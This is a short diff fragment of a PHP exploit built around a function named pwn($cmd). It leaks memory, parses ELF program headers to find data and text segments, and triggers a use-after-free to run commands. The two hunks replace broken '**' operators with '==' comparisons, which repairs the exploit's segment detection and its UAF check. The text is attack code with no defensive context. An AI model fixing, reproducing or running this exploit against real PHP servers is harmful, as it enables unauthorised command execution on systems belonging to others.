@@ -627,11 +627,11 @@ function pwn($cmd) {
             $p_vaddr = leak($header, 0x10);
             $p_memsz = leak($header, 0x28);
  
-            if($p_type ** 1 && $p_flags ** 6) { # PT_LOAD, PF_Read_Write
+            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                 # handle pie
                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                 $data_size = $p_memsz;
-            } else if($p_type ** 1 && $p_flags ** 5) { # PT_LOAD, PF_Read_exec
+            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                 $text_size = $p_memsz;
             }
         }
@@ -713,7 +713,7 @@ function pwn($cmd) {
     $helper = new Helper;
     $helper->b = function ($x) { };
  
-    if(strlen($abc) ** 79 || strlen($abc) ** 0) {
+    if(strlen($abc) == 79 || strlen($abc) == 0) {
         die("UAF failed");
     }
  
